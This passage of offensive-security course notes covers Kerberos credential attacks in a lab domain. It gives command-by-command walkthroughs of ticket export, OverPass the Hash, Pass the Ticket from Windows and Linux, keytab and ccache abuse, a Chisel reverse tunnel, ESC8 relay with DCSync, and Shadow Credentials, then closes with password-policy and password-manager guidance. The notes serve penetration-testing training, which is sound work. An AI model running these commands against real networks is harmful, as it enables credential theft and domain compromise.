Ticket filenames follow the format: `[value]-username@service-domain.local.kirbi`. Files ending in `$` are computer account tickets. Tickets with `krbtgt` in the name are TGTs. Both Mimikatz and Rubeus must run as administrator to collect all tickets.

> **Note:** On some Windows 10 versions, Mimikatz 2.2.0 exports tickets with wrong encryption (`des_cbc_md4`). If exported tickets don't work, use Rubeus instead (see 6.2).

---

### 6.2 Exporting Tickets with Rubeus

Rubeus can dump all tickets as **Base64-encoded strings** instead of files — easier to copy and reuse. Use `/nowrap` to prevent line wrapping. Requires local admin to collect all users' tickets.

```cmd
c:\tools> Rubeus.exe dump /nowrap

Action: Dump Kerberos Ticket Data (All Users)

[*] Current LUID : 0x6c680
    ServiceName  :  krbtgt/inlanefreight.htb
    UserName     :  plaintext
    StartTime    :  7/12/2022 9:42:15 AM
    EndTime      :  7/12/2022 7:42:15 PM
    KeyType      :  aes256_cts_hmac_sha1
    Base64EncodedTicket : doIE9jCCBPKgAwIB... <SNIP>
```

---

### 6.3 Pass the Key / OverPass the Hash

Traditional PtH reuses an NTLM hash but never touches Kerberos. **OverPass the Hash** goes further — it takes an NTLM hash or AES key and converts it into a full **TGT**, letting you operate fully within the Kerberos authentication flow. First, extract all Kerberos encryption keys with Mimikatz using `sekurlsa::ekeys`:

```cmd
mimikatz # sekurlsa::ekeys

* Username : plaintext
* Domain   : inlanefreight.htb
* Key List :
  aes256_hmac   b21c99fc068e3ab2ca789bccbef67de43791fd911c6e15ead25641a8fda3fe60
  rc4_hmac_nt   3f74aa8f08f712f09cd5177b5c1ce50f
```

**Mimikatz - Pass the Key aka. OverPass the Hash**
```cmd
mimikatz # sekurlsa::pth /domain:inlanefreight.htb /user:plaintext /ntlm:3f74aa8f08f712f09cd5177b5c1ce50f

user    : plaintext
domain  : inlanefreight.htb
program : cmd.exe
NTLM    : 3f74aa8f08f712f09cd5177b5c1ce50f
  |  PID 1128
  \_ rc4_hmac_nt  OK
  \_ *Password replace -> null
```

A new `cmd.exe` window opens running as the target user. Use it to request access to any service in that user's context.

**Rubeus - Pass the Key aka. OverPass the Hash**
```cmd
c:\tools> Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /aes256:b21c99fc068e3ab2ca789bccbef67de43791fd911c6e15ead25641a8fda3fe60 /nowrap

[*] Action: Ask TGT
[+] TGT request successful!
    ServiceName  : krbtgt/inlanefreight.htb
    UserName     : plaintext
    StartTime    : 7/12/2022 11:28:26 AM
    EndTime      : 7/12/2022 9:28:26 PM
    KeyType      : rc4_hmac
    Base64(key)  : 0TOKzUHdgBQKMk8+xmOV2w==
```

> **Note:** Mimikatz requires admin rights for OverPass the Hash; Rubeus does not. Using RC4/NTLM instead of AES256 in a Kerberos exchange may be flagged as an **"encryption downgrade"** by modern detection systems.

---

### 6.4 Pass the Ticket (PtT)

Now that we have Kerberos tickets (from OverPass the Hash or direct export), we can use them to move laterally. With Rubeus we retrieved a ticket in Base64 format — instead of just keeping it, we use the `/ptt` flag to submit it directly into the current logon session. Rubeus accepts tickets in three ways:

**Rubeus - Pass the Ticket**

Request a TGT and inject it immediately into the current session with `/ptt`:
```cmd
c:\tools> Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /rc4:3f74aa8f08f712f09cd5177b5c1ce50f /ptt

[+] TGT request successful!
[+] Ticket successfully imported!
    UserName  : plaintext
    StartTime : 7/12/2022 12:27:47 PM
    EndTime   : 7/12/2022 10:27:47 PM
```

**Rubeus - Pass the Ticket (import .kirbi file from disk)**

Another way is to import the ticket into the current session using the `.kirbi` file from disk:
```cmd
c:\tools> Rubeus.exe ptt /ticket:[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi

[*] Action: Import Ticket
[+] ticket successfully imported!

c:\tools> dir \\DC01.inlanefreight.htb\c$
    Program Files
    Program Files (x86)
    <SNIP>
```

**Pass the Ticket - Base64 Format**

We can also convert a `.kirbi` file to Base64 using PowerShell and pass that string directly to Rubeus:
```powershell
PS c:\tools> [Convert]::ToBase64String([IO.File]::ReadAllBytes("[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"))
doQAAAWfMIQAAAWZ... <SNIP>
```
```cmd
c:\tools> Rubeus.exe ptt /ticket:doIE1jCCBNK...
[+] ticket successfully imported!
```

---

### 6.5 Mimikatz - Pass the Ticket

Finally, we can also perform the Pass the Ticket attack using the Mimikatz module `kerberos::ptt` and the `.kirbi` file that contains the ticket we want to import:

```cmd
mimikatz # kerberos::ptt "C:\Users\plaintext\Desktop\Mimikatz\[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"

* File: '[ticket].kirbi': OK

mimikatz # exit

c:\tools> dir \\DC01.inlanefreight.htb\c$
    Program Files
    Program Files (x86)
    <SNIP>
```

> **Tip:** Instead of exiting Mimikatz to get the ticket into your prompt, use `misc::cmd` inside Mimikatz — it launches a new command prompt window with the ticket already imported.

---

### 6.6 Pass the Ticket with PowerShell Remoting (Windows)

**PowerShell Remoting** lets you run commands on remote machines via WinRM (TCP/5985 HTTP, TCP/5986 HTTPS). To use it you need admin rights, membership in the **Remote Management Users** group, or explicit PS Remoting permissions. If a user has no admin rights but is in the Remote Management Users group, PtT via PowerShell Remoting still works.

**Mimikatz - PowerShell Remoting with Pass the Ticket**

To use PowerShell Remoting with Pass the Ticket, we use Mimikatz to import our ticket and then open a PowerShell console and connect to the target machine. Open a new `cmd.exe`, run Mimikatz, import the ticket using `kerberos::ptt`, then launch PowerShell from that same `cmd.exe` and use `Enter-PSSession` to connect:

**Mimikatz - Pass the Ticket for lateral movement**
```cmd
mimikatz # kerberos::ptt "C:\Users\Administrator.WIN01\Desktop\[0;1812a]-2-0-40e10000-john@krbtgt-INLANEFREIGHT.HTB.kirbi"
* File: '[ticket].kirbi': OK
mimikatz # exit

c:\tools> powershell
PS C:\tools> Enter-PSSession -ComputerName DC01
[DC01]: PS C:\Users\john\Documents> whoami
inlanefreight\john
[DC01]: PS C:\Users\john\Documents> hostname
DC01
```

**Rubeus - PowerShell Remoting with Pass the Ticket**

Rubeus has the option `createnetonly`, which creates a sacrificial process/logon session (Logon type 9). The process is hidden by default, but we can specify the flag `/show` to display the process — the result is the equivalent of `runas /netonly`. This prevents the erasure of existing TGTs for the current logon session.

**Create a sacrificial process with Rubeus:**
```cmd
C:\tools> Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show

[*] Action: Create process (/netonly)
[+] Process : 'cmd.exe' successfully created with LOGON_TYPE = 9
[+] ProcessID : 1556
[+] LUID      : 0xe07648
```

The above command opens a new cmd window. From that window, execute Rubeus to request a new TGT with `/ptt` to import the ticket into our current session, then connect to DC01 using PowerShell Remoting.

**Rubeus - Pass the Ticket for lateral movement:**
```cmd
C:\tools> Rubeus.exe asktgt /user:john /domain:inlanefreight.htb /aes256:9279bcbd40db957a0ed0d3856b2e67f9bb58e6dc7fc07207d0763ce2713f11dc /ptt

[+] TGT request successful!
[+] Ticket successfully imported!
    UserName : john
    EndTime  : 7/18/2022 3:44:50 PM

C:\tools> powershell
PS C:\tools> Enter-PSSession -ComputerName DC01
[DC01]: PS C:\Users\john\Documents> whoami
inlanefreight\john
[DC01]: PS C:\Users\john\Documents> hostname
DC01
```

The `createnetonly` flag prevents overwriting existing TGTs in the current session — it creates a clean isolated session for the new ticket only.

---

## 7. Pass the Ticket (PtT) from Linux

Although not common, Linux computers can connect to Active Directory to provide centralized identity management. A Linux machine joined to AD commonly uses Kerberos for authentication. If we compromise such a machine, we can find Kerberos tickets stored on it and use them to impersonate other users and gain more access to the network. Linux stores tickets in two ways: **ccache files** (in `/tmp`) and **keytab files**. A Linux machine does not even need to be domain-joined to use Kerberos tickets — tickets can be used in scripts or for network authentication independently.

---

### 7.0 Kerberos on Linux – Scenario

Windows and Linux use the same Kerberos process (TGT and TGS requests), but they store tickets differently. In most Linux systems, tickets are stored as ccache files in `/tmp`, and the path is stored in the environment variable `KRB5CCNAME`. Keytab files store pairs of Kerberos principals and encrypted keys so scripts can authenticate automatically without entering a password. Any machine with a Kerberos client can create keytab files — they are portable and not tied to the system that created them.

**Scenario:** We have a machine `LINUX01` connected to the Domain Controller, reachable only through `MS01`. We can connect via port forward — TCP/2222 on MS01 maps to TCP/22 on LINUX01. Credentials given: `david@inlanefreight.htb` / `Password2`.

```bash
$ ssh david@inlanefreight.htb@10.129.204.23 -p 2222

Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 5.4.0-126-generic x86_64)
  System load:  0.09    Users logged in: 2
  Memory usage: 32%     IPv4 address for ens160: 172.16.1.15

david@inlanefreight.htb@linux01:~$
```

---

### 7.1 Identifying Domain-Joined Linux Machines

Use `realm` to check if the machine is domain-joined and see which users/groups are permitted to log in:

```bash
david@inlanefreight.htb@linux01:~$ realm list

inlanefreight.htb
  type: kerberos
  realm-name: INLANEFREIGHT.HTB
  domain-name: inlanefreight.htb
  configured: kerberos-member
  server-software: active-directory
  client-software: sssd
  login-formats: %U@inlanefreight.htb
  permitted-logins: david@inlanefreight.htb, julio@inlanefreight.htb
  permitted-groups: Linux Admins
```

Output confirms the machine is a Kerberos member of `inlanefreight.htb` and shows exactly which users (`david`, `julio`) and which group (`Linux Admins`) can log in. If `realm` is not available, check for `sssd` or `winbind` services running:

```bash
david@inlanefreight.htb@linux01:~$ ps -ef | grep -i "winbind\|sssd"

root  2140  1  0 Sep29 ?  00:00:01 /usr/sbin/sssd -i --logger=files
root  2141  2140  0 Sep29 ?  00:00:08 /usr/libexec/sssd/sssd_be --domain inlanefreight.htb
root  2142  2140  0 Sep29 ?  00:00:03 /usr/libexec/sssd/sssd_nss
root  2143  2140  0 Sep29 ?  00:00:03 /usr/libexec/sssd/sssd_pam
```

---

### 7.2 Finding KeyTab Files

Keytab files store Kerberos credentials for passwordless authentication (used in scripts). Admins commonly give them a `.keytab` extension. Search for them using `find`:

```bash
david@inlanefreight.htb@linux01:~$ find / -name *keytab* -ls 2>/dev/null

131610  4  -rw-------  1 root  root  1348 Oct  4 16:26 /etc/krb5.keytab
262169  4  -rw-rw-rw-  1 root  root   216 Oct 12 15:13 /opt/specialfiles/carlos.keytab
```

> **Note:** To use a keytab file, you must have read and write (`rw`) permissions on it. `/etc/krb5.keytab` is the default computer account keytab — root-only. If you get access to it, you can impersonate the computer account `LINUX01$`.

Also check cronjobs for scripts using `kinit` — these may reference keytab files that don't have the `.keytab` extension:

```bash
carlos@inlanefreight.htb@linux01:~$ crontab -l
*5/ * * * * /home/carlos@inlanefreight.htb/.scripts/kerberos_script_test.sh

carlos@inlanefreight.htb@linux01:~$ cat /home/carlos@inlanefreight.htb/.scripts/kerberos_script_test.sh
#!/bin/bash
kinit svc_workstations@INLANEFREIGHT.HTB -k -t /home/carlos@inlanefreight.htb/.scripts/svc_workstations.kt
smbclient //dc01.inlanefreight.htb/svc_workstations -c 'ls' -k -no-pass > /home/carlos@inlanefreight.htb/script-test-results.txt
```

The script uses `kinit` (which requests a TGT and stores it in a ccache file) with a keytab file `svc_workstations.kt`. This means we can extract or abuse that keytab to impersonate `svc_workstations`.

---

### 7.3 Finding ccache Files

A **ccache file** holds Kerberos credentials while they are valid (usually for the duration of the user's session). Once a user logs in, a ccache file is created and its path stored in `KRB5CCNAME`. By default they live in `/tmp`.

```bash
david@inlanefreight.htb@linux01:~$ env | grep -i krb5

KRB5CCNAME=FILE:/tmp/krb5cc_647402606_qd2Pfh
```

As root, you can list and read all ccache files for all logged-in users:

```bash
david@inlanefreight.htb@linux01:~$ ls -la /tmp

-rw-------  1 julio@inlanefreight.htb   domain users@inlanefreight.htb 1406 Oct  6 16:38 krb5cc_647401106_tBswau
-rw-------  1 david@inlanefreight.htb   domain users@inlanefreight.htb 1406 Oct  6 15:23 krb5cc_647401107_Gf415d
-rw-------  1 carlos@inlanefreight.htb  domain users@inlanefreight.htb 1433 Oct  6 15:43 krb5cc_647402606_qd2Pfh
```

---

### 7.4 Abusing KeyTab Files – Impersonation

Use `klist` to check which user a keytab was created for, then use `kinit` to import it and impersonate that user:

```bash
# Check who the keytab belongs to
david@inlanefreight.htb@linux01:~$ klist -k -t /opt/specialfiles/carlos.keytab

Keytab name: FILE:/opt/specialfiles/carlos.keytab
KVNO  Timestamp            Principal
----  -------------------  ----------------------------------------
   1  10/06/2022 17:09:13  carlos@INLANEFREIGHT.HTB
```

```bash
# Confirm our current ticket (we are david)
david@inlanefreight.htb@linux01:~$ klist
Default principal: david@INLANEFREIGHT.HTB
Valid starting     Expires
10/06/22 17:02:11  10/07/22 03:02:11  krbtgt/INLANEFREIGHT.HTB@INLANEFREIGHT.HTB

# Import Carlos's keytab — we are now carlos
david@inlanefreight.htb@linux01:~$ kinit carlos@INLANEFREIGHT.HTB -k -t /opt/specialfiles/carlos.keytab
david@inlanefreight.htb@linux01:~$ klist
Default principal: carlos@INLANEFREIGHT.HTB
Valid starting     Expires
10/06/22 17:16:11  10/07/22 03:16:11  krbtgt/INLANEFREIGHT.HTB@INLANEFREIGHT.HTB
```

> **Note:** `kinit` is case-sensitive — use the exact principal name as shown by `klist` (username lowercase, domain uppercase).

Verify access to Carlos's SMB share:

```bash
david@inlanefreight.htb@linux01:~$ smbclient //dc01/carlos -k -c ls

  .                     D  0  Thu Oct  6 14:46:26 2022
  ..                    D  0  Thu Oct  6 14:46:26 2022
  carlos.txt            A  15 Thu Oct  6 14:46:54 2022

        7706623 blocks of size 4096. 4452852 blocks available
```

> **Tip:** Before importing a new keytab, save your current ccache file (copy the path in `KRB5CCNAME`) so you can restore your original ticket later.

---

### 7.5 KeyTab Extract – Getting Hashes

To gain actual login access to Carlos's account on the Linux machine, we need his password — not just his ticket. We can extract hashes from his keytab file using **KeyTabExtract**:

```bash
david@inlanefreight.htb@linux01:~$ python3 /opt/keytabextract.py /opt/specialfiles/carlos.keytab

[*] RC4-HMAC Encryption detected. Will attempt to extract NTLM hash.
[*] AES256-CTS-HMAC-SHA1 key found. Will attempt hash extraction.
[*] AES128-CTS-HMAC-SHA1 hash discovered. Will attempt hash extraction.
[+] Keytab File successfully imported.
        REALM : INLANEFREIGHT.HTB
        SERVICE PRINCIPAL : carlos/
        NTLM HASH : a738f92b3c08b424ec2d99589a9cce60
        AES-256 HASH : 42ff0baa586963d9010584eb9590595e8cd47c489e25e82aae69b1de2943007f
        AES-128 HASH : fa74d5abf4061baa1d4ff8485d1261c4
```

The NTLM hash can be cracked with Hashcat, John the Ripper, or online tools like `crackstation.net`. The password for Carlos is `Password5`. A keytab file can contain multiple hash types and even credentials for multiple users. Log in as Carlos:

```bash
david@inlanefreight.htb@linux01:~$ su - carlos@inlanefreight.htb

Password:
carlos@inlanefreight.htb@linux01:~$ klist
Default principal: carlos@INLANEFREIGHT.HTB
Valid starting       Expires
10/07/2022 11:01:13  10/07/2022 21:01:13  krbtgt/INLANEFREIGHT.HTB@INLANEFREIGHT.HTB
```

**Obtaining more hashes:** Carlos has a cronjob using a keytab file named `svc_workstations.kt`. Repeat the extraction process, crack the hash, and log in as `svc_workstations`.

---

### 7.6 Abusing ccache Files

To abuse a ccache file you only need **read privileges** on it. ccache files in `/tmp` are only readable by the user who created them, but as root you can read all of them. Log in as `svc_workstations`, check sudo rights, and escalate to root:

```bash
$ ssh svc_workstations@inlanefreight.htb@10.129.204.23 -p 2222

svc_workstations@inlanefreight.htb@linux01:~$ sudo -l
User svc_workstations@inlanefreight.htb may run the following commands on linux01:
    (ALL) ALL

svc_workstations@inlanefreight.htb@linux01:~$ sudo su
root@linux01:/home/svc_workstations@inlanefreight.htb# whoami
root
```

As root, list all ccache files and identify high-value users:

```bash
root@linux01:~# ls -la /tmp

-rw-------  1 julio@inlanefreight.htb            domain users  1406 Oct  7 11:35 krb5cc_647401106_HRJDux
-rw-------  1 julio@inlanefreight.htb            domain users  1406 Oct  7 11:35 krb5cc_647401106_qMKxc6
-rw-------  1 david@inlanefreight.htb            domain users  1406 Oct  7 10:43 krb5cc_647401107_O0oUWh
-rw-------  1 svc_workstations@inlanefreight.htb domain users  1535 Oct  7 11:21 krb5cc_647401109_D7gVZF
-rw-------  1 carlos@inlanefreight.htb           domain users  3175 Oct  7 11:35 krb5cc_647402606
-rw-------  1 carlos@inlanefreight.htb           domain users  1433 Oct  7 11:01 krb5cc_647402606_ZX6KFA
```

Check if `julio` is a Domain Admin:

```bash
root@linux01:~# id julio@inlanefreight.htb

uid=647401106(julio@inlanefreight.htb) gid=647400513(domain users@inlanefreight.htb)
groups=647400513(domain users@inlanefreight.htb),647400512(domain admins@inlanefreight.htb)
```

Julio is a Domain Admin. Copy his ccache file and set `KRB5CCNAME` to impersonate him:

```bash
root@linux01:~# cp /tmp/krb5cc_647401106_I8I133 .
root@linux01:~# export KRB5CCNAME=/root/krb5cc_647401106_I8I133
root@linux01:~# klist

Ticket cache: FILE:/root/krb5cc_647401106_I8I133
Default principal: julio@INLANEFREIGHT.HTB
Valid starting       Expires
10/07/2022 13:25:01  10/07/2022 23:25:01  krbtgt/INLANEFREIGHT.HTB@INLANEFREIGHT.HTB

root@linux01:~# smbclient //dc01/C$ -k -c ls -no-pass
  john              D    0  Mon Jul 18 13:19:50 2022
  julio             D    0  Mon Jul 18 13:54:02 2022
  Program Files     DR   0  Wed Oct  6 20:50:50 2021
  Users             DR   0  Thu Oct  6 11:46:05 2022
  Windows            D   0  Wed Oct  5 13:20:00 2022
        7706623 blocks of size 4096. 4447612 blocks available
```

> **Note:** Always check the `valid starting` and `expires` fields with `klist`. An expired ccache file will not work.

---

### 7.7 Using Linux Attack Tools with Kerberos

Many Linux attack tools support Kerberos. From a domain-joined machine, just set `KRB5CCNAME`. From a non-domain attack host, you need to tunnel traffic through the network using **Chisel + Proxychains** and manually set `/etc/hosts` for name resolution.

**Setup steps:**

**Step 1 — Edit `/etc/hosts`:**
```bash
$ cat /etc/hosts
172.16.1.10 inlanefreight.htb  dc01.inlanefreight.htb  dc01
172.16.1.5  ms01.inlanefreight.htb  ms01
```

**Step 2 — Configure proxychains (`/etc/proxychains.conf`):**
```
[ProxyList]
socks5 127.0.0.1 1080
```

**Step 3 — Start Chisel server on attack host:**
```bash
$ sudo ./chisel server --reverse
2022/10/10 07:26:15 server: Reverse tunneling enabled
2022/10/10 07:26:15 server: Listening on http://0.0.0.0:8080
```

**Step 4 — Connect Chisel client from MS01:**
```cmd
C:\htb> c:\tools\chisel.exe client 10.10.14.33:8080 R:socks
2022/10/10 06:34:20 client: Connected (Latency 125.6177ms)
```

**Step 5 — Set KRB5CCNAME to Julio's ccache:**
```bash
$ export KRB5CCNAME=/home/htb-student/krb5cc_647401106_I8I133
```

**Impacket via proxychains (use hostname, not IP; use `-k` and `-no-pass`):**
```bash
$ proxychains impacket-wmiexec dc01 -k

[proxychains] Strict chain ... 127.0.0.1:1080 ... dc01:445 ... OK
[proxychains] Strict chain ... INLANEFREIGHT.HTB:88 ... OK
[!] Launching semi-interactive shell
C:\>whoami
inlanefreight\julio
```

**Evil-WinRM via proxychains (install `krb5-user` first, configure `/etc/krb5.conf`):**
```bash
$ cat /etc/krb5.conf
[libdefaults]
        default_realm = INLANEFREIGHT.HTB
[realms]
    INLANEFREIGHT.HTB = {
        kdc = dc01.inlanefreight.htb
    }

$ proxychains evil-winrm -i dc01 -r inlanefreight.htb

[proxychains] Strict chain ... dc01:5985 ... OK
*Evil-WinRM* PS C:\Users\julio\Documents> whoami ; hostname
inlanefreight\julio
DC01
```

---

### 7.8 Converting Tickets – Impacket ticketConverter

Convert between Linux ccache and Windows kirbi formats using `impacket-ticketConverter`:

```bash
# ccache → kirbi
$ impacket-ticketConverter krb5cc_647401106_I8I133 julio.kirbi

[*] converting ccache to kirbi...
[+] done
```

Import the converted `.kirbi` into a Windows session using Rubeus:

```cmd
C:\htb> C:\tools\Rubeus.exe ptt /ticket:c:\tools\julio.kirbi

[*] Action: Import Ticket
[+] Ticket successfully imported!

C:\htb> klist
#0> Client: julio @ INLANEFREIGHT.HTB
    Server: krbtgt/INLANEFREIGHT.HTB @ INLANEFREIGHT.HTB
    Start Time: 10/10/2022 5:46:02
    End Time:   10/10/2022 15:46:02

C:\htb> dir \\dc01\julio
07/14/2022  04:18 PM    17 julio.txt
```

---

### 7.9 Linikatz

**Linikatz** is a Cisco-created tool that brings Mimikatz-style credential extraction to Linux AD environments. It requires root and extracts all Kerberos tickets, hashes, and credentials from SSSD, Samba, FreeIPA, Vintella, and other AD integrations. Output is saved to a folder named `linikatz.` containing ccache and keytab files.

```bash
$ wget https://raw.githubusercontent.com/CiscoCXSecurity/linikatz/master/linikatz.sh
$ /opt/linikatz.sh

I: [sss-check] SSS AD configuration
-rw------- 1 root root 4154 Oct 10 19:48 /var/lib/sss/db/ccache_INLANEFREIGHT.HTB

I: [kerberos-check] Kerberos configuration
-rw------- 1 root root 1348 Oct  4 16:26 /etc/krb5.keytab
-rw------- 1 julio@inlanefreight.htb  domain users 1406 Oct 10 19:55 /tmp/krb5cc_647401106_HRJDux
-rw------- 1 carlos@inlanefreight.htb domain users 3175 Oct 10 19:55 /tmp/krb5cc_647402606

I: [sss-check] SSS ticket list
Ticket cache: FILE:/var/lib/sss/db/ccache_INLANEFREIGHT.HTB
Default principal: LINUX01$@INLANEFREIGHT.HTB
Valid starting       Expires
10/10/2022 19:48:03  10/11/2022 05:48:03  krbtgt/INLANEFREIGHT.HTB@INLANEFREIGHT.HTB

I: [kerberos-check] User Kerberos tickets
Ticket cache: FILE:/tmp/krb5cc_647401106_HRJDux
Default principal: julio@INLANEFREIGHT.HTB
Valid starting       Expires
10/10/2022 19:55:02  10/11/2022 05:55:02  krbtgt/INLANEFREIGHT.HTB@INLANEFREIGHT.HTB
```

---

## 8. Pass the Certificate

**PKINIT** is a Kerberos extension that allows public key cryptography for authentication (e.g., smart cards). **Pass-the-Certificate** uses X.509 certificates to obtain TGTs. It is used with AD CS attacks and Shadow Credentials attacks.

---

### 8.1 ESC8 – NTLM Relay to AD CS Web Enrollment

AD CS allows certificate enrollment via HTTP (`/CertSrv`). Attackers relay NTLM authentication to this endpoint to obtain a certificate for a machine account.

**Step 1 – Start ntlmrelayx:**
```bash
impacket-ntlmrelayx -t http://10.129.234.110/certsrv/certfnsh.asp \
  --adcs -smb2support --template KerberosAuthentication
```

**Step 2 – Coerce authentication using Printer Bug:**
```bash
python3 printerbug.py INLANEFREIGHT.LOCAL/wwhite:"password"@10.129.234.109 10.10.16.12
```

The relay captures and relays DC01's auth, issuing a `.pfx` certificate file for `DC01$`.

**Step 3 – Get TGT using certificate:**
```bash
python3 gettgtpkinit.py -cert-pfx ../DC01\$.pfx -dc-ip 10.129.234.109 \
  'inlanefreight.local/dc01$' /tmp/dc.ccache
```

**Step 4 – DCSync as DC01$:**
```bash
export KRB5CCNAME=/tmp/dc.ccache
impacket-secretsdump -k -no-pass -dc-ip 10.129.234.109 \
  -just-dc-user Administrator 'INLANEFREIGHT.LOCAL/DC01$'@DC01.INLANEFREIGHT.LOCAL
```

---

### 8.2 Shadow Credentials (msDS-KeyCredentialLink)

If a user has `AddKeyCredentialLink` rights over another user (visible in BloodHound), they can write a public key to that user's `msDS-KeyCredentialLink` attribute and then authenticate as them via PKINIT.

**Step 1 – Add key credential with pywhisker:**
```bash
pywhisker --dc-ip 10.129.234.109 -d INLANEFREIGHT.LOCAL \
  -u wwhite -p 'password' --target jpinkman --action add
```

Output: a `.pfx` file and its password.

**Step 2 – Get TGT as victim:**
```bash
python3 gettgtpkinit.py -cert-pfx ../eFUVVTPf.pfx -pfx-pass 'bmRH4LK7...' \
  -dc-ip 10.129.234.109 INLANEFREIGHT.LOCAL/jpinkman /tmp/jpinkman.ccache
```

**Step 3 – Use the ticket:**
```bash
export KRB5CCNAME=/tmp/jpinkman.ccache
evil-winrm -i dc01.inlanefreight.local -r inlanefreight.local
```

---

## 9. Password Policies

A **password policy** is a set of rules for how passwords must be created, managed, and stored. It covers the full password lifecycle — creation, storage, and transmission. Policies must be both defined and enforced using technology (e.g., Group Policy in Active Directory). Common standards include **NIST SP800-63B**, **CIS Password Policy Guide**, and **PCI DSS**.

---

### 9.1 Common Policy Requirements

A typical policy may require passwords to:
- Be at least 8 characters long
- Include uppercase and lowercase letters
- Include at least one number and one special character
- Not match the username
- Be changed every 60 days

However, simple policies can still produce weak passwords. A user who picks `Inlanefreight01!` satisfies all requirements but uses a predictable pattern (company name + number + symbol). Password expiration often leads users to make incremental changes (e.g., `01` → `02`).

---

### 9.2 Blacklisted Words

Password policies should blacklist common weak choices including company names, season/month names, and variations of words like `welcome`, `password`, `123456`, and `abcde`. Attackers are aware that users often include company-related words in passwords.

---

### 9.3 Creating Strong Passwords

Strong passwords can be passphrases using ordinary words. Example: `()The name of my dog is Popy!` — this is long, complex, and would take trillions of years to crack. Tools like **PasswordMonster** evaluate password strength, while **1Password Generator** can generate random ones. Avoid including personal info that attackers could find via OSINT.

---

## 10. Password Managers

The average person has around 100 passwords. Reusing or simplifying passwords creates security risks. A **password manager** solves this by securely storing credentials in an encrypted database protected by one master password. Features typically include password generation, 2FA support, browser integration, and multi-device sync.

---

### 10.1 How Password Managers Work

Most managers derive an encryption key from the master password using a key derivation function (like PBKDF2). This supports **Zero-Knowledge Encryption** — even the vendor cannot read your vault. The vault is decrypted locally with a key that never leaves your device.

**Bitwarden example flow:**
1. Master password → KDF → Master Key
2. Master Key → Master Password Hash (sent to server for auth)
3. Master Key → Decryption Key (used locally to decrypt vault)

---

### 10.2 Cloud vs Local Password Managers

**Cloud managers** (Bitwarden, 1Password, LastPass, Dashlane, NordPass) sync across devices via encrypted databases. The convenience is high but relies on the vendor's security.

**Local managers** (KeePass, Password Safe, KWalletManager) store the database on your machine. You control security entirely but lose automatic sync and must handle backups yourself.

---

### 10.3 Alternatives to Passwords

Passwords can be complemented or replaced with:
- **MFA (Multi-Factor Authentication)**
- **FIDO2 / YubiKey** — passwordless login using a physical device
- **OTP / TOTP** — one-time or time-based codes
- **IP Restrictions** and **Device Compliance** (via Microsoft Endpoint Manager)

Major vendors like Microsoft, Okta, and Auth0 are pushing **passwordless authentication**, using possession factors (something you have) or inherent factors (something you are) instead of knowledge factors (passwords). This eliminates risks like password reuse, theft, and sharing.

---

*End of Notes*
